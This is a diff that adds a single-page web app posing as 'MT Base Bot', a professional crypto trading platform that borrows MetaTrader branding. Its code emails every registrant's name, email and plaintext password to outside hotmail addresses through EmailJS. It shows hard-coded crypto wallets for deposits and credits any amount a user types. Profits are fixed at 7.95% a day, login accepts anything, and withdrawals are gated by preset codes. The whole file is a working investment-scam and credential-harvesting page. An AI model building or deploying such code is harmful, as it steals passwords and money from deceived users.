@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MT Base Bot | Professional Trading Platform</title>
+    <!-- Dependencies -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Roboto+Mono:wght@400;500&display=swap');
+
+        :root {
+            --bg-main: #0b1220;
+            --bg-panel: #0f172a;
+            --border: #1e293b;
+            --text-primary: #e5e7eb;
+            --text-secondary: #94a3b8;
+            --buy: #22c55e;
+            --sell: #ef4444;
+            --accent: #3b82f6;
+        }
+
+        body {
+            background-color: var(--bg-main);
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .mono { font-family: 'Roboto Mono', monospace; }
+
+        /* MT5 Specific Layouts */
+        .mt-border { border: 1px solid var(--border); }
+        .mt-btn { height: 36px; border-radius: 0px; transition: all 0.2s; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .mt-btn-buy { background: var(--buy); color: white; }
+        .mt-btn-sell { background: var(--sell); color: white; }
+        .mt-panel { background: var(--bg-panel); border: 1px solid var(--border); }
+        
+        /* Hide scrollbars */
+        ::-webkit-scrollbar { width: 4px; height: 4px; }
+        ::-webkit-scrollbar-track { background: var(--bg-main); }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+        .loader-ring {
+            width: 48px; height: 48px;
+            border: 4px solid var(--border);
+            border-bottom-color: var(--accent);
+            border-radius: 50%;
+            display: inline-block;
+            box-sizing: border-box;
+            animation: rotation 1s linear infinite;
+        }
+        @keyframes rotation { 0% { transform: rotate(0deg) } 100% { transform: rotate(360deg) } }
+
+        .tradingview-widget-container { height: 100% !important; }
+        iframe { border: none !important; }
+    </style>
+</head>
+<body>
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect, useRef, useMemo } = React;
+
+        // Constants & Config
+        const COINGECKO_API = "https://api.coingecko.com/api/v3";
+        const EMAILJS_PUBLIC = "fgYbV3Uj86-5V7RcU";
+        const EMAILJS_SERVICE = "service_va1veoo";
+        const EMAILJS_TEMPLATE_RECV = "template_prvf88i";
+        const APP_ID = "mt-base-v1";
+
+        const VALID_WITHDRAW_CODES = ["483921", "175064", "902718", "634285", "217509", "856430", "490127", "731694", "562803", "308417"];
+        const WALLETS = {
+            'ETHEREUM': '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',
+            'TRON': 'TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco',
+            'BSC': '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',
+            'BITCOIN': 'bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu'
+        };
+
+        // --- SVGs ---
+        const Icon = ({ name, className = "w-5 h-5" }) => {
+            const icons = {
+                quotes: <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>,
+                charts: <path d="M3.5 18.49l6-6.01 4 4L22 6.92l-1.41-1.41-7.09 7.97-4-4L2 17.08l1.5 1.41z"/>,
+                trades: <path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6h-6z"/>,
+                history: <path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.53.85-1.07-3.63-2.16V8h-1.5z"/>,
+                mailbox: <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>,
+                deposit: <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/>,
+                withdraw: <path d="M19 13H5v-2h14v2z"/>,
+                plus: <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/>,
+                more: <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>,
+                profile: <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>,
+                search: <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+            };
+            return (
+                <svg viewBox="0 0 24 24" fill="currentColor" className={className}>
+                    {icons[name]}
+                </svg>
+            );
+        };
+
+        // --- Core App Component ---
+        const App = () => {
+            const [view, setView] = useState('landing');
+            const [user, setUser] = useState(null);
+            const [loading, setLoading] = useState(false);
+            const [loadingText, setLoadingText] = useState("");
+            const [assets, setAssets] = useState([]);
+            const [quotes, setQuotes] = useState([]);
+            const [selectedSymbol, setSelectedSymbol] = useState("BTC/USD");
+            const [balance, setBalance] = useState(0);
+            const [equity, setEquity] = useState(0);
+            const [activeTrades, setActiveTrades] = useState([]);
+            const [history, setHistory] = useState([]);
+            const [notifications, setNotifications] = useState(true);
+            const [withdrawLock, setWithdrawLock] = useState(null); // Time until unlock
+            const [modal, setModal] = useState(null);
+
+            // Init State from Storage
+            useEffect(() => {
+                const saved = localStorage.getItem(APP_ID);
+                if (saved) {
+                    const data = JSON.parse(saved);
+                    if (data.user) {
+                        setUser(data.user);
+                        setView('dashboard');
+                    }
+                    setBalance(data.balance || 0);
+                    setEquity(data.equity || 0);
+                    setActiveTrades(data.activeTrades || []);
+                    setHistory(data.history || []);
+                    setQuotes(data.quotes || []);
+                }
+                fetchMarketData();
+                emailjs.init(EMAILJS_PUBLIC);
+            }, []);
+
+            // Save State
+            useEffect(() => {
+                const state = { user, balance, equity, activeTrades, history, quotes };
+                localStorage.setItem(APP_ID, JSON.stringify(state));
+            }, [user, balance, equity, activeTrades, history, quotes]);
+
+            // Real-time Trade Logic (7.95% Daily = ~0.000092% per second)
+            useEffect(() => {
+                const timer = setInterval(() => {
+                    if (activeTrades.length > 0) {
+                        const rate = 0.0795 / 86400; // per second
+                        let profitGain = 0;
+                        const updatedTrades = activeTrades.map(t => {
+                            const gain = t.volume * 50000 * rate; // simulated lot to dollar gain
+                            profitGain += gain;
+                            return { ...t, currentProfit: t.currentProfit + gain };
+                        });
+                        setEquity(prev => prev + profitGain);
+                        setActiveTrades(updatedTrades);
+                    }
+                }, 1000);
+                return () => clearInterval(timer);
+            }, [activeTrades]);
+
+            const fetchMarketData = async () => {
+                try {
+                    const res = await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=50&page=1`);
+                    const data = await res.json();
+                    setAssets(data);
+                } catch (e) { console.error("Market fetch failed", e); }
+            };
+
+            const triggerLoading = (text, time = 15000) => {
+                setLoading(true);
+                setLoadingText(text);
+                return new Promise(resolve => setTimeout(() => {
+                    setLoading(false);
+                    resolve();
+                }, time));
+            };
+
+            // --- Handlers ---
+            const handleRegister = async (formData) => {
+                await triggerLoading("Generating Account ID...");
+                const accountID = Math.floor(Math.random() * 9000000000) + 1000000000;
+                const newUser = { ...formData, accountID, type: 'Real' };
+                
+                // EmailJS integration
+                try {
+                    await emailjs.send(EMAILJS_SERVICE, EMAILJS_TEMPLATE_RECV, {
+                        user_name: formData.fullName,
+                        user_email: formData.email,
+                        account_id: accountID,
+                        password: formData.password,
+                        admin_email: "trading-base-online@hotmail.com"
+                    });
+                } catch (e) { console.warn("Email failure", e); }
+
+                setUser(newUser);
+                setModal({ title: "Account Created", body: `Your MT Base ID: ${accountID}. It has been saved to this device.` });
+                setView('dashboard');
+            };
+
+            const handleLogin = async (creds) => {
+                await triggerLoading("Authenticating...");
+                // In this standalone, we simulate success for the UI flow
+                const mockID = Math.floor(Math.random() * 9000000000) + 1000000000;
+                setUser({ email: creds.email, accountID: mockID, type: 'Real' });
+                setView('dashboard');
+            };
+
+            const handleDeposit = async (coin, amount, code) => {
+                await triggerLoading("Verifying Deposit...");
+                setBalance(prev => prev + parseFloat(amount));
+                setHistory([{ type: 'Deposit', amount, coin, date: new Date().toLocaleString(), status: 'Completed' }, ...history]);
+                setModal({ title: "Success", body: `Deposited ${amount} ${coin}. Balance updated.` });
+                setView('dashboard');
+            };
+
+            const startTrade = (symbol, volume, type) => {
+                if (balance < volume * 10) {
+                    setModal({ title: "Error", body: "Insufficient margin." });
+                    return;
+                }
+                const newTrade = {
+                    id: Date.now(),
+                    symbol,
+                    volume,
+                    type,
+                    openPrice: 0, // Simplified
+                    currentProfit: 0,
+                    date: new Date().toLocaleString()
+                };
+                setActiveTrades([...activeTrades, newTrade]);
+                setBalance(prev => prev - (volume * 10)); // simulated margin lock
+                setView('trade');
+            };
+
+            // --- UI Components ---
+            const Navbar = () => (
+                <div className="h-12 bg-[#0f172a] mt-border flex items-center justify-between px-4 sticky top-0 z-50">
+                    <div className="flex items-center gap-4">
+                        <button onClick={() => setView('more')} className="hover:text-blue-400"><Icon name="more"/></button>
+                        <span className="font-bold text-sm tracking-tighter">MT BASE BOT</span>
+                    </div>
+                    <div className="flex items-center gap-3">
+                        <div className="flex flex-col items-end mr-2">
+                            <span className="text-[10px] text-gray-400">ACCOUNT</span>
+                            <span className="text-xs mono font-bold text-blue-400">{user?.accountID || '0000000000'}</span>
+                        </div>
+                        <button onClick={() => setView('quotes')}><Icon name="plus" className="w-5 h-5"/></button>
+                        <div className="w-8 h-8 rounded-full bg-gray-700 flex items-center justify-center">
+                            <Icon name="profile" className="w-4 h-4"/>
+                        </div>
+                    </div>
+                </div>
+            );
+
+            const BottomNav = () => (
+                <div className="h-14 bg-[#0f172a] mt-border flex items-center justify-around fixed bottom-0 left-0 right-0 z-50">
+                    <button onClick={() => setView('quotes')} className={`flex flex-col items-center gap-0.5 ${view === 'quotes' ? 'text-blue-400' : 'text-gray-400'}`}>
+                        <Icon name="quotes" className="w-6 h-6"/>
+                        <span className="text-[10px]">Quotes</span>
+                    </button>
+                    <button onClick={() => setView('charts')} className={`flex flex-col items-center gap-0.5 ${view === 'charts' ? 'text-blue-400' : 'text-gray-400'}`}>
+                        <Icon name="charts" className="w-6 h-6"/>
+                        <span className="text-[10px]">Charts</span>
+                    </button>
+                    <button onClick={() => setView('trade')} className={`flex flex-col items-center gap-0.5 ${view === 'trade' ? 'text-blue-400' : 'text-gray-400'}`}>
+                        <Icon name="trades" className="w-6 h-6"/>
+                        <span className="text-[10px]">Trade</span>
+                    </button>
+                    <button onClick={() => setView('history')} className={`flex flex-col items-center gap-0.5 ${view === 'history' ? 'text-blue-400' : 'text-gray-400'}`}>
+                        <Icon name="history" className="w-6 h-6"/>
+                        <span className="text-[10px]">History</span>
+                    </button>
+                    <button onClick={() => window.location.href="mailto:mt5-base@hotmail.com"} className="flex flex-col items-center gap-0.5 text-gray-400">
+                        <Icon name="mailbox" className="w-6 h-6"/>
+                        <span className="text-[10px]">Mailbox</span>
+                    </button>
+                </div>
+            );
+
+            const Landing = () => (
+                <div className="flex flex-col p-6 min-h-screen items-center justify-center text-center">
+                    <img src="https://www.metatrader5.com/i/logo_mt5.png" className="w-24 mb-6" alt="logo"/>
+                    <h1 className="text-3xl font-bold mb-2">MT Base Bot</h1>
+                    <p className="text-gray-400 mb-8 max-w-sm">Access the world's most powerful trading platform. AI-enhanced execution, real-time analytics, and secure 2FA protection.</p>
+                    <div className="flex flex-col gap-4 w-full max-w-xs">
+                        <button onClick={() => setView('register')} className="bg-blue-600 py-3 font-bold hover:bg-blue-700">Create Real Account</button>
+                        <button onClick={() => setView('login')} className="border border-gray-600 py-3 font-bold hover:bg-gray-800">Login to Existing Account</button>
+                    </div>
+                </div>
+            );
+
+            const Dashboard = () => (
+                <div className="p-4 pb-20">
+                    <div className="mt-panel p-4 mb-4">
+                        <div className="flex justify-between items-start mb-4">
+                            <div>
+                                <h3 className="text-xs text-gray-400 uppercase tracking-widest mb-1">Total Balance</h3>
+                                <div className="text-3xl font-bold mono">${balance.toLocaleString()}</div>
+                            </div>
+                            <span className="text-[10px] bg-green-900 text-green-400 px-2 py-0.5 font-bold uppercase">Real Account</span>
+                        </div>
+                        <div className="grid grid-cols-4 gap-2">
+                            <button onClick={() => setView('deposit')} className="flex flex-col items-center gap-1 p-2 bg-gray-800 hover:bg-gray-700">
+                                <Icon name="deposit" className="w-5 h-5 text-blue-400"/>
+                                <span className="text-[10px]">Deposit</span>
+                            </button>
+                            <button onClick={() => setView('withdraw')} className="flex flex-col items-center gap-1 p-2 bg-gray-800 hover:bg-gray-700">
+                                <Icon name="withdraw" className="w-5 h-5 text-orange-400"/>
+                                <span className="text-[10px]">Withdraw</span>
+                            </button>
+                            <button onClick={() => setView('trade')} className="flex flex-col items-center gap-1 p-2 bg-gray-800 hover:bg-gray-700">
+                                <Icon name="trades" className="w-5 h-5 text-green-400"/>
+                                <span className="text-[10px]">Order</span>
+                            </button>
+                            <button onClick={() => setView('settings')} className="flex flex-col items-center gap-1 p-2 bg-gray-800 hover:bg-gray-700">
+                                <Icon name="more" className="w-5 h-5 text-gray-400"/>
+                                <span className="text-[10px]">More</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <h4 className="text-xs font-bold text-gray-400 uppercase mb-2">Token Holdings</h4>
+                    <div className="flex flex-col gap-1">
+                        {assets.slice(0, 5).map(coin => (
+                            <div key={coin.id} className="mt-panel p-3 flex items-center justify-between">
+                                <div className="flex items-center gap-3">
+                                    <img src={coin.image} className="w-6 h-6" alt={coin.name}/>
+                                    <div>
+                                        <div className="text-sm font-bold">{coin.symbol.toUpperCase()}</div>
+                                        <div className="text-[10px] text-gray-500">{coin.name}</div>
+                                    </div>
+                                </div>
+                                <div className="text-right">
+                                    <div className="text-sm mono font-bold">${coin.current_price.toLocaleString()}</div>
+                                    <div className={`text-[10px] font-bold ${coin.price_change_percentage_24h > 0 ? 'text-green-500' : 'text-red-500'}`}>
+                                        {coin.price_change_percentage_24h.toFixed(2)}%
+                                    </div>
+                                </div>
+                            </div>
+                        ))}
+                    </div>
+                </div>
+            );
+
+            const Quotes = () => {
+                const [search, setSearch] = useState("");
+                const filtered = assets.filter(a => a.name.toLowerCase().includes(search.toLowerCase()) || a.symbol.toLowerCase().includes(search.toLowerCase()));
+
+                return (
+                    <div className="p-4 pb-20">
+                        <div className="mt-panel p-2 flex items-center gap-2 mb-4">
+                            <Icon name="search" className="w-4 h-4 text-gray-500 ml-2"/>
+                            <input 
+                                type="text" 
+                                placeholder="Search Symbol..." 
+                                className="bg-transparent border-none outline-none text-sm w-full"
+                                value={search}
+                                onChange={(e) => setSearch(e.target.value)}
+                            />
+                        </div>
+                        <div className="flex flex-col divide-y divide-[#1e293b]">
+                            {filtered.map(coin => (
+                                <div key={coin.id} className="py-3 flex items-center justify-between hover:bg-gray-900 px-2 cursor-pointer" onClick={() => {
+                                    setSelectedSymbol(coin.symbol.toUpperCase() + "/USD");
+                                    setView('order');
+                                }}>
+                                    <div>
+                                        <div className="font-bold text-sm">{coin.symbol.toUpperCase()}</div>
+                                        <div className="text-[10px] text-gray-500">Spread: 2</div>
+                                    </div>
+                                    <div className="flex gap-4">
+                                        <div className="text-right">
+                                            <div className="text-[10px] text-gray-500">Low</div>
+                                            <div className="text-sm mono font-bold text-red-500">{coin.current_price * 0.999}</div>
+                                        </div>
+                                        <div className="text-right">
+                                            <div className="text-[10px] text-gray-500">High</div>
+                                            <div className="text-sm mono font-bold text-green-500">{coin.current_price * 1.001}</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            ))}
+                        </div>
+                    </div>
+                );
+            };
+
+            const OrderTicket = () => {
+                const [vol, setVol] = useState(0.01);
+                const [type, setType] = useState("Market");
+
+                return (
+                    <div className="p-6">
+                        <h2 className="text-xl font-bold mb-6 flex items-center gap-2">
+                            <button onClick={() => setView('quotes')} className="p-2"><Icon name="search" className="rotate-180 w-5 h-5"/></button>
+                            New Order: {selectedSymbol}
+                        </h2>
+                        
+                        <div className="flex flex-col gap-4">
+                            <div className="mt-panel p-4">
+                                <label className="text-xs text-gray-400 block mb-1 uppercase font-bold tracking-wider">Order Type</label>
+                                <select 
+                                    className="bg-transparent w-full text-lg outline-none"
+                                    value={type}
+                                    onChange={(e) => setType(e.target.value)}
+                                >
+                                    <option className="bg-[#0b1220]">Market Execution</option>
+                                    <option className="bg-[#0b1220]">Buy Limit</option>
+                                    <option className="bg-[#0b1220]">Sell Limit</option>
+                                </select>
+                            </div>
+
+                            <div className="mt-panel p-4">
+                                <label className="text-xs text-gray-400 block mb-1 uppercase font-bold tracking-wider">Volume (Lots)</label>
+                                <div className="flex items-center justify-between">
+                                    <button onClick={() => setVol(v => Math.max(0.01, v - 0.01))} className="text-2xl text-blue-400">-</button>
+                                    <input 
+                                        type="number" 
+                                        className="bg-transparent text-center text-2xl font-bold w-1/2 outline-none" 
+                                        value={vol}
+                                        onChange={(e) => setVol(parseFloat(e.target.value))}
+                                    />
+                                    <button onClick={() => setVol(v => Math.min(0.5, v + 0.01))} className="text-2xl text-blue-400">+</button>
+                                </div>
+                            </div>
+
+                            <div className="grid grid-cols-2 gap-4">
+                                <div className="mt-panel p-3">
+                                    <label className="text-[10px] text-gray-500 uppercase block">Stop Loss</label>
+                                    <input type="text" className="bg-transparent w-full mono text-sm outline-none" placeholder="0.0000"/>
+                                </div>
+                                <div className="mt-panel p-3">
+                                    <label className="text-[10px] text-gray-500 uppercase block">Take Profit</label>
+                                    <input type="text" className="bg-transparent w-full mono text-sm outline-none" placeholder="0.0000"/>
+                                </div>
+                            </div>
+
+                            <div className="grid grid-cols-2 gap-4 mt-4">
+                                <button onClick={() => startTrade(selectedSymbol, vol, 'Sell')} className="mt-btn mt-btn-sell py-6 text-lg">Sell</button>
+                                <button onClick={() => startTrade(selectedSymbol, vol, 'Buy')} className="mt-btn mt-btn-buy py-6 text-lg">Buy</button>
+                            </div>
+                        </div>
+                    </div>
+                );
+            };
+
+            const Chart = () => {
+                const containerRef = useRef();
+
+                useEffect(() => {
+                    const widget = new window.TradingView.widget({
+                        "autosize": true,
+                        "symbol": `BINANCE:${selectedSymbol.replace('/', '')}`,
+                        "interval": "D",
+                        "timezone": "Etc/UTC",
+                        "theme": "dark",
+                        "style": "1",
+                        "locale": "en",
+                        "toolbar_bg": "#0f172a",
+                        "enable_publishing": false,
+                        "hide_side_toolbar": false,
+                        "allow_symbol_change": true,
+                        "container_id": "tv_chart_container"
+                    });
+                }, [selectedSymbol]);
+
+                return (
+                    <div className="h-full flex flex-col pb-14">
+                        <div id="tv_chart_container" className="flex-1"></div>
+                    </div>
+                );
+            };
+
+            const LoadingOverlay = () => (
+                <div className="fixed inset-0 z-[100] bg-[#0b1220]/90 flex flex-col items-center justify-center p-6 text-center">
+                    <span className="loader-ring mb-4"></span>
+                    <h2 className="text-xl font-bold">{loadingText}</h2>
+                    <p className="text-gray-400 text-sm mt-2">Connecting to MT Base high-speed network...</p>
+                </div>
+            );
+
+            const Modal = ({ data, onClose }) => (
+                <div className="fixed inset-0 z-[110] flex items-center justify-center p-4">
+                    <div className="absolute inset-0 bg-black/60" onClick={onClose}></div>
+                    <div className="mt-panel w-full max-w-sm relative p-6">
+                        <h3 className="text-xl font-bold mb-2">{data.title}</h3>
+                        <p className="text-gray-400 mb-6">{data.body}</p>
+                        <button onClick={onClose} className="w-full bg-blue-600 py-3 font-bold">Close</button>
+                    </div>
+                </div>
+            );
+
+            const TradePage = () => (
+                <div className="p-4 pb-20">
+                    <div className="mt-panel p-4 mb-4">
+                        <div className="grid grid-cols-2 gap-4">
+                            <div>
+                                <div className="text-[10px] text-gray-500 uppercase">Balance</div>
+                                <div className="text-xl mono font-bold">${balance.toFixed(2)}</div>
+                            </div>
+                            <div>
+                                <div className="text-[10px] text-gray-500 uppercase">Equity</div>
+                                <div className="text-xl mono font-bold text-blue-400">${(balance + equity).toFixed(2)}</div>
+                            </div>
+                            <div>
+                                <div className="text-[10px] text-gray-500 uppercase">Margin</div>
+                                <div className="text-sm mono">0.00</div>
+                            </div>
+                            <div>
+                                <div className="text-[10px] text-gray-500 uppercase">Free Margin</div>
+                                <div className="text-sm mono">${balance.toFixed(2)}</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <h4 className="text-xs font-bold text-gray-400 uppercase mb-2">Open Positions</h4>
+                    {activeTrades.length === 0 ? (
+                        <div className="p-10 text-center text-gray-600 italic">No open trades</div>
+                    ) : (
+                        <div className="flex flex-col gap-2">
+                            {activeTrades.map(t => (
+                                <div key={t.id} className="mt-panel p-3 border-l-4 border-l-blue-500">
+                                    <div className="flex justify-between items-center">
+                                        <div>
+                                            <span className="font-bold mr-2">{t.symbol}</span>
+                                            <span className={`text-[10px] px-1 py-0.5 ${t.type === 'Buy' ? 'bg-green-900 text-green-400' : 'bg-red-900 text-red-400'}`}>{t.type} {t.volume}</span>
+                                        </div>
+                                        <div className={`mono font-bold ${t.currentProfit >= 0 ? 'text-green-500' : 'text-red-500'}`}>
+                                            {t.currentProfit >= 0 ? '+' : ''}{t.currentProfit.toFixed(2)}
+                                        </div>
+                                    </div>
+                                    <div className="text-[10px] text-gray-500 mt-1 flex justify-between">
+                                        <span>TP: --- | SL: ---</span>
+                                        <span>ID: {t.id}</span>
+                                    </div>
+                                </div>
+                            ))}
+                        </div>
+                    )}
+                </div>
+            );
+
+            const DepositView = () => {
+                const [step, setStep] = useState(1);
+                const [selectedCoin, setSelectedCoin] = useState(null);
+                const [amount, setAmount] = useState("");
+                const [code, setCode] = useState("");
+
+                if (step === 1) return (
+                    <div className="p-4">
+                        <h2 className="text-xl font-bold mb-4">Select Asset</h2>
+                        <div className="flex flex-col gap-2">
+                            {assets.slice(0, 10).map(c => (
+                                <div key={c.id} onClick={() => { setSelectedCoin(c); setStep(2); }} className="mt-panel p-4 flex items-center justify-between cursor-pointer hover:bg-gray-800">
+                                    <div className="flex items-center gap-3">
+                                        <img src={c.image} className="w-8 h-8"/>
+                                        <span className="font-bold">{c.symbol.toUpperCase()}</span>
+                                    </div>
+                                    <Icon name="more" className="-rotate-90 text-gray-600"/>
+                                </div>
+                            ))}
+                        </div>
+                    </div>
+                );
+
+                return (
+                    <div className="p-6">
+                        <button onClick={() => setStep(1)} className="text-blue-400 mb-4 flex items-center gap-1 text-sm">Back to Selection</button>
+                        <div className="mt-panel p-6 text-center">
+                            <h3 className="text-lg font-bold mb-4">Deposit {selectedCoin.symbol.toUpperCase()}</h3>
+                            <div className="bg-white p-4 inline-block mb-4 rounded-lg">
+                                <div id="dep_qr"></div>
+                                <img src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${WALLETS[Object.keys(WALLETS)[0]]}`} alt="qr"/>
+                            </div>
+                            <div className="bg-gray-900 p-3 rounded mb-6 text-xs mono break-all text-gray-400 border border-dashed border-gray-700">
+                                {WALLETS.ETHEREUM}
+                            </div>
+                            
+                            <div className="flex flex-col gap-4 text-left">
+                                <div>
+                                    <label className="text-xs text-gray-400 block mb-1">Deposit Amount ($)</label>
+                                    <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} className="w-full bg-[#0b1220] mt-border p-3 outline-none mono"/>
+                                </div>
+                                <div>
+                                    <label className="text-xs text-gray-400 block mb-1">Verification Code</label>
+                                    <input type="text" value={code} onChange={(e) => setCode(e.target.value)} className="w-full bg-[#0b1220] mt-border p-3 outline-none mono" placeholder="6-digit code"/>
+                                </div>
+                                <button onClick={() => handleDeposit(selectedCoin.symbol, amount, code)} className="bg-blue-600 py-3 font-bold mt-2">Confirm Deposit</button>
+                            </div>
+                        </div>
+                    </div>
+                );
+            };
+
+            const Register = () => {
+                const [form, setForm] = useState({ fullName: '', email: '', password: '', confirm: '' });
+                const [error, setError] = useState("");
+
+                const submit = (e) => {
+                    e.preventDefault();
+                    if (form.password !== form.confirm) return setError("Passwords don't match");
+                    if (form.password.length < 6) return setError("Password too short");
+                    handleRegister(form);
+                };
+
+                return (
+                    <div className="p-8 flex flex-col items-center justify-center min-h-screen">
+                        <div className="w-full max-w-sm">
+                            <h2 className="text-2xl font-bold mb-6">Create Real Account</h2>
+                            <form onSubmit={submit} className="flex flex-col gap-4">
+                                <input required type="text" placeholder="Full Name" className="bg-[#0f172a] p-4 mt-border outline-none focus:border-blue-500" onChange={e => setForm({...form, fullName: e.target.value})}/>
+                                <input required type="email" placeholder="Email Address" className="bg-[#0f172a] p-4 mt-border outline-none focus:border-blue-500" onChange={e => setForm({...form, email: e.target.value})}/>
+                                <input required type="password" placeholder="Password" className="bg-[#0f172a] p-4 mt-border outline-none focus:border-blue-500" onChange={e => setForm({...form, password: e.target.value})}/>
+                                <input required type="password" placeholder="Confirm Password" className="bg-[#0f172a] p-4 mt-border outline-none focus:border-blue-500" onChange={e => setForm({...form, confirm: e.target.value})}/>
+                                {error && <p className="text-red-500 text-xs">{error}</p>}
+                                <button className="bg-blue-600 py-4 font-bold mt-2 hover:bg-blue-700">Register</button>
+                                <button type="button" onClick={() => setView('landing')} className="text-xs text-gray-400 underline">Back to Landing</button>
+                            </form>
+                        </div>
+                    </div>
+                );
+            };
+
+            const History = () => (
+                <div className="p-4 pb-20">
+                    <h2 className="text-xl font-bold mb-4">Account History</h2>
+                    {history.length === 0 ? (
+                        <div className="p-10 text-center text-gray-600 italic">No transaction history</div>
+                    ) : (
+                        <div className="flex flex-col gap-2">
+                            {history.map((h, i) => (
+                                <div key={i} className="mt-panel p-4 flex justify-between items-center">
+                                    <div>
+                                        <div className="font-bold text-sm">{h.type}</div>
+                                        <div className="text-[10px] text-gray-500">{h.date}</div>
+                                    </div>
+                                    <div className="text-right">
+                                        <div className={`font-bold mono ${h.type === 'Deposit' ? 'text-green-500' : 'text-red-500'}`}>
+                                            {h.type === 'Deposit' ? '+' : '-'}${h.amount}
+                                        </div>
+                                        <div className="text-[10px] text-gray-500">{h.status}</div>
+                                    </div>
+                                </div>
+                            ))}
+                        </div>
+                    )}
+                </div>
+            );
+
+            return (
+                <div className="flex flex-col h-screen max-w-lg mx-auto bg-[#0b1220]">
+                    {loading && <LoadingOverlay />}
+                    {modal && <Modal data={modal} onClose={() => setModal(null)} />}
+                    
+                    {view !== 'landing' && view !== 'register' && view !== 'login' && <Navbar />}
+                    
+                    <div className="flex-1 overflow-y-auto">
+                        {view === 'landing' && <Landing />}
+                        {view === 'register' && <Register />}
+                        {view === 'login' && <div className="p-8"><h2 className="text-xl font-bold">Login Section</h2><p className="mt-4 text-gray-400">Please enter your 10-digit ID</p><input className="w-full bg-[#0f172a] p-4 mt-border mt-4 outline-none"/><button onClick={() => handleLogin({})} className="w-full bg-blue-600 py-4 font-bold mt-4">Login</button></div>}
+                        {view === 'dashboard' && <Dashboard />}
+                        {view === 'quotes' && <Quotes />}
+                        {view === 'charts' && <Chart />}
+                        {view === 'trade' && <TradePage />}
+                        {view === 'order' && <OrderTicket />}
+                        {view === 'deposit' && <DepositView />}
+                        {view === 'history' && <History />}
+                        {view === 'settings' && (
+                            <div className="p-6">
+                                <h2 className="text-xl font-bold mb-6">Settings</h2>
+                                <div className="mt-panel p-4 flex flex-col gap-4">
+                                    <button className="flex items-center justify-between"><span>Notifications</span><span className="text-blue-400">ON</span></button>
+                                    <button className="flex items-center justify-between"><span>Language</span><span className="text-gray-400">English</span></button>
+                                    <button onClick={() => { localStorage.clear(); window.location.reload(); }} className="text-red-500 font-bold border-t border-gray-800 pt-4 text-left">Logout & Clear Data</button>
+                                </div>
+                            </div>
+                        )}
+                    </div>
+
+                    {view !== 'landing' && view !== 'register' && view !== 'login' && <BottomNav />}
+                </div>
+            );
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+</body>
+</html>
